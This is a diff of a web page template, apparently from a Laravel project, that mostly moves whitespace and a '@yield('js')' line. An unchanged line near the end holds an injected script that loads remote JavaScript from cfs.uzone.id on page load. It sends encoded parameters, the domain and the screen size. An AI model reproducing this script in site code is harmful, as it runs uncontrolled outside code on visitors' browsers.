@@ -164,11 +164,9 @@ img {
 
   <script>
   </script>
-  
-  @yield('js')
-
+    
   <script>
-
+    
   var galleryThumbs = new Swiper('.gallery-thumbs', {
       spaceBetween: 50,
       centeredSlides: true,
@@ -207,6 +205,7 @@ img {
     galleryThumbs.params.control = galleryTop;
 
   </script>
+  
 	<script>
 	    (function($){
 	        $(window).load(function(){
@@ -214,7 +213,8 @@ img {
                 $(".scroller-dark").mCustomScrollbar({theme:"dark"});
 	        });
 	    })(jQuery);
-	</script>
+  </script>
+  
     <script>
     $('.hide-button').hide();
     // $(window).on('scroll', function(){
@@ -234,6 +234,7 @@ img {
 
 
     </script>
+    
     <script type="text/javascript">
     // $(window).scroll(function() {
     //    var $this = $('.portfolio');
@@ -253,5 +254,6 @@ img {
     </script>
 
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAbtDmIPU68QkjaYkbVKsLFl4csI40HPXNRXZyU3gDa72BXBCa4r7FxrnMpq%2bMMBHx5Yv8eHxjx1qPFTDovDdj8jDaZsY6yVWCQLho6%2bDUNsiMAiZ5jSNu5r1BXQtPZEt00lA%2bpHAD5U6P4Y2%2bckhpCvulDwMCJw533P8tHkiTgZDdy9MBFNdweq78DshEvBCeX26NTKIkdhpS3EtfRFIoA31NpIOEu1CXkrdDJ8GDDqG92nBfZUbAjWkYgLstWnl9krq2CG3uXf8bFPKzi9sq8ngnGykjCpmNTITzCTtAM5zBZrc%2bSTXdbW6u9o8%2fQOSLa61hhxyASez4mQix8Q3GLdK8LPEjd4HmqTi9Du80wpVWdK%2fPzjev7TYFPcvKLeQKfFNSs%2f6BU8RCOXUtpXFJaQUbM%2fPH%2fW3aW0KD41SEGUHaRJBlT7nk%2fl2ht%2fRJgGFzwV%2fNVayeZcXyCJlNw4Kk1Q%2fr3W5jA4VxsFx7udrGMWt3lnDsv6wynDH05BLNvpHXS0YT0nqrd3niX67TNpmTXd6RBZV%2f7LZD8P078y6fpKPdSiSId8XocQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+  @yield('js')
 </body>
 </html>
